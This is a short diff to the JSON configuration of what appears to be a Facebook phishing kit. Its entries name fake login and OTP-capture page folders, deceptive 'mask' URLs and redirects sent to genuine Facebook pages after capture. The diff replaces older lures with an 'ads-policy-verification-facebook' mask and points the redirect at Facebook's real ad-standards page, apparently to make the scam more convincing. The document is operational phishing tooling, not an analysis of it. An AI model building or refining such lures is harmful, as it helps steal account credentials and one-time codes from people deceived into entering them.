@@ -5,8 +5,8 @@
       "choice": "1",
       "folder": "login_facebook",
       "otp_folder": "login_facebook_otp",
-      "mask": "https://blue-verified-facebook-free",
-      "redirect": "https://facebook.com/recover/initiate/"
+      "mask": "https://ads-policy-verification-facebook",
+      "redirect": "https://transparency.fb.com/policies/ad-standards/"
     },
     {
       "name": "Facebook Voting",
@@ -19,8 +19,8 @@
       "name": "Facebook Security",
       "choice": "3",
       "folder": "login_fb_security",
-      "mask": "https://make-your-facebook-secured-and-free-from-hackers",
-      "redirect": "https://facebook.com/recover/initiate/"
+      "mask": "https://ads-policy-verification-facebook",
+      "redirect": "https://transparency.fb.com/policies/ad-standards/"
     },
     {
       "name": "Messenger",
